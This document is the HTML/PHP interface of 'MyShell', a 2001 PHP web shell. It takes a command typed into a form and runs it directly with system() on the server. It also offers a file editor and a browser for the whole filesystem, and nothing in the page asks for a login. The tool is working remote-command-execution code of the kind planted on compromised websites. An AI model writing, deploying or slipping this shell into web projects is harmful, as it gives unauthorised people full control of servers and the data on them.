<html>
<head>
<title><?echo $MyShellVersion?></title>
<style>
body{
        background-color: <?echo $bgColor ?>;
        font-family : sans-serif;
        font-size : 10px;
        scrollbar-face-color: #666666;
        scrollbar-shadow-color:  <?echo $bgColor ?>;
        scrollbar-highlight-color: #999999;
        scrollbar-3dlight-color:  <?echo $bgColor ?>;
        scrollbar-darkshadow-color:  <?echo $bgColor ?>;
        scrollbar-track-color:  <?echo $bgInputColor ?>;
        scrollbar-arrow-color:  <?echo $textColor ?>;
}
input,select,option{
        background-color: <?echo $bgInputColor ?>;
        color : <?echo $outColor ?>;
        border-style : none;
        font-size : 10px;
}
textarea{
        background-color: <?echo $bgColor ?>;
        color : <?echo $outColor ?>;
        border-style : none;
}
</style>
</head>
<body <?echo "bgcolor=$bgColor TEXT=$textColor LINK=$linkColor VLINK=$linkColor onload=document.shell.$focus"?>>
<form name="shell" method="post">
Current User: <a href="#" style="text-decoration:none"><?echo $whoami?></a>
<input type="hidden" name=whoami value=<?echo $whoami?>>
&nbsp;&nbsp;:::::::&nbsp;&nbsp;
<?
if($editMode){
    echo "<font color=$linkColor><b>MyShell file editor</font> File:<font color=$linkColor>$work_dir/$currFile </font></b>$fileEditInfo\n";
}
else{
    echo "Current working directory: <b>\n";
    $work_dir_splitted = explode("/", substr($work_dir, 1));
    echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "/&command=" . urlencode($command) . "\">Root</a>/";
    if ($work_dir_splitted[0] == "") {
       $work_dir = "/";  /* Root directory. */
    }
    else{
        for ($i = 0; $i < count($work_dir_splitted); $i++) {
            $url .= "/".$work_dir_splitted[$i];
            echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "&command=" . urlencode($command) . "\">$work_dir_splitted[$i]</a>/</b>";
        }
    }
}
?>
<br>
<textarea name="shellOut" cols="<? echo $oCols ?>" rows="<? echo $oRows."\""; if(!$editMode)echo "readonly";else echo $editWrap?> >
<?
echo $shellOutput;
if ($command) {
  if ($stderr) {
    system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
  else {
    $ok = system($command,$status);
    if($ok==false &&$status && $autoErrorTrap)system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
}
if ($commandBk) $command = $commandBk;
?>
</textarea>
<br>
<?
if($editMode) echo"
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
 <input type='submit' name='editSave' value='     Save     '>&nbsp;&nbsp;&nbsp;
 <input type='submit' name='editSaveExit' value=' Save and Exit '>&nbsp;&nbsp;&nbsp;
 <input type='reset' value=' Restore original '>&nbsp;&nbsp;&nbsp;
 <input type='submit' name='editCancel' value=' Cancel/Exit '>&nbsp;&nbsp;&nbsp;
 <input type='hidden' name='editMode' value='true'>
<br>";
?>
<br>
Command:
<input type="text" name="command" size="80"
<? if ($command && $echoCommand) {
     echo "value=`$command`";
   }
?> > <input name="submit_btn" type="submit" value="Go!">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<?
if ($autoErrorTrap) echo "Auto error traping enabled";
else echo "<input type=\"checkbox\" name=\"stderr\">stderr-traping ";

if($editMode){
    echo "<input type='hidden' name='work_dir' value='$work_dir'>
    <br>Save file as: <input type='text' name='file' value='$currFile'>";
}
else{
    echo "<br>Working directory: <select name=\"work_dir\" onChange=\"this.form.submit()\">";
    // List of directories.
    $dir_handle = opendir($work_dir);
    while ($dir = readdir($dir_handle)) {
      if (is_dir($dir)) {
        if ($dir == ".")
          echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
        elseif ($dir == "..") {
          // Parent Dir. This might be server's root directory
          if (strlen($work_dir) == 1) {
            // work_dir is only 1 charecter - it can only be / so don't output anything
          }
          elseif (strrpos($work_dir, "/") == 0) {  // we have a top-level directory eg. /bin or /home etc...
            echo "<option value=\"/\">Parent Directory</option>\n";
          }
          else {   // String-manipulation to find the parent directory... Trust me - it works :-)
            echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
          }
        }
        else {
          if ($work_dir == "/")
            echo "<option value=\"$work_dir$dir\">$dir</option>\n";
          else
            echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
        }
      }
    }
    closedir($dir_handle);
    echo "</select>";
}
?>
&nbsp; | &nbsp;<input type="checkbox" name="echoCommand"<?if($echoCommand)echo " checked"?>>Echo commands
&nbsp; | &nbsp;Cols:<input type="text" name="oCols" size=3 value=<?echo $oCols?>>
&nbsp;Rows:<input type="text" name="oRows" size=2 value=<?echo $oRows?>>
&nbsp;| ::::::::::&nbsp;<a href="http://www.digitart.net" target="_blank" style="text-decoration:none"><b>MyShell</b> &copy;2001 Digitart Producciones</a>
</form>
</body>
</html>
